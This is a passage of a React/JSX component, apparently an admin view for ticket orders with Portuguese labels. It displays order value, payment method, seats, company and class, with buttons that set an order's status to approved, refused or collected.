                            <div>
                              <p className="text-gray-400 font-semibold mb-2 flex items-center gap-1.5 uppercase tracking-wide">
                                <Ticket className="w-3.5 h-3.5" /> Pedido
                              </p>
                              <div className="space-y-1.5">
                                <p><span className="text-gray-400">Valor</span> <span className="text-gray-900 ml-2 font-bold">R$ {(order.valor_total || 0).toFixed(2).replace(".", ",")}</span></p>
                                <p><span className="text-gray-400">Método</span> <span className="text-gray-900 ml-2 capitalize">{order.metodo_pagamento}</span></p>
                                <p><span className="text-gray-400">Assentos</span> <span className="text-gray-900 ml-2">{order.assentos}</span></p>
                                <p><span className="text-gray-400">Empresa</span> <span className="text-gray-900 ml-2">{order.company}</span></p>
                                <p><span className="text-gray-400">Classe</span> <span className="text-gray-900 ml-2">{order.tipo_assento}</span></p>
                              </div>
                            </div>
                          </div>

                          <div className="flex items-center gap-3 mt-5 pt-4 border-t border-gray-200">
                            <span className="text-xs text-gray-400 font-mono">{order.id.slice(0, 8)}</span>
                            <div className="flex-1" />
                            {order.status !== "aprovado" && (
                              <button
                                onClick={() => updateStatus(order.id, "aprovado")}
                                className="flex items-center gap-1.5 px-4 py-1.5 rounded-lg bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-semibold transition-colors"
                              >
                                <CheckCircle className="w-3.5 h-3.5" /> Aprovar
                              </button>
                            )}
                            {order.status !== "recusado" && (
                              <button
                                onClick={() => updateStatus(order.id, "recusado")}
                                className="flex items-center gap-1.5 px-4 py-1.5 rounded-lg bg-red-600 hover:bg-red-700 text-white text-xs font-semibold transition-colors"
                              >
                                <XCircle className="w-3.5 h-3.5" /> Recusar
                              </button>
                            )}
                            {order.status !== "coletado" && (
                              <button
                                onClick={() => updateStatus(order.id, "coletado")}
                                className="flex items-center gap-1.5 px-4 py-1.5 rounded-lg bg-[#8629cc] hover:bg-[#6b1fb3] text-white text-xs font-semibold transition-colors"
                              >
                                <Package className="w-3.5 h-3.5" /> Coletado
                              </button>
                            )}
                          </div>
                        </div>
                      )}
                    </div>
                  );
                })}
              </div>
            )}
          </>
        )}
      </div>
    </div>
  );
}
